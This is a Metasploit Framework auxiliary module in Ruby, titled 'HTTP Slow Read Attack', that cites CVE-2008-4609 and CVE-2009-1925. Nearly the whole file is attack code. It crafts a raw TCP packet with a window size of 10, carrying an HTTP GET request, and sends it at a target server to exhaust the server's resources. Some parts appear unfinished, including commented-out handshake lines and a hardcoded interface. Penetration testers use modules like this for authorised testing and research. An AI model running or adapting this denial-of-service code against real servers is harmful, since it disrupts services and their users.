##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	#include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos

	def initialize
		super(
			'Name'        => 'HTTP Slow Read Attack',
			'Description' => %q{
				Implements an HTTP slow read attack.
			},
			'Author'      => ['Doug Prostko <dougtko[at]gmail.com>'],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'CVE', '2008-4609' ],
					[ 'CVE', '2009-1925' ],
					[ 'URL', 'https://community.qualys.com/blogs/securitylabs/2012/01/05/slow-read'],
				],
			'DisclosureDate' => '???')

		register_options([
			#OptInt.new('RPORT', [true, 'The destination port', 389]),
			OptString.new('URI', [true, 'Resource to request', '/']),
		], self.class)
	end

	def run

		open_pcap

		print_status("Sending request with small TCP window to #{rhost}")

		p = PacketFu::TCPPacket.new
		#p.ip_saddr = datastore['SHOST'] || Rex::Socket.source_address(rhost)
		#p.tcp_ack = rand(0x100000000)
		#p.tcp_flags.syn = 1
		#p.tcp_flags.ack = 1
		p.ip_daddr = datastore['RHOST']
		p.tcp_dport = datastore['RPORT'].to_i
		p.tcp_win = 10
		p.payload = "GET #{datastore['URI']} HTTP/1.1\r\n"
		p.payload << "Host: #{datastore['RHOST']}\r\n"
		p.payload << "User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) Presto/2.9.168 Version/11.50\r\n"
		p.payload << "Referer: http://code.google.com/p/slowhttptest/\r\n"
		p.recalc

		res = p.to_w("eth0")
		puts res.inspect
		capture_sendto(p, datastore['RHOST'])
		close_pcap

	end
end
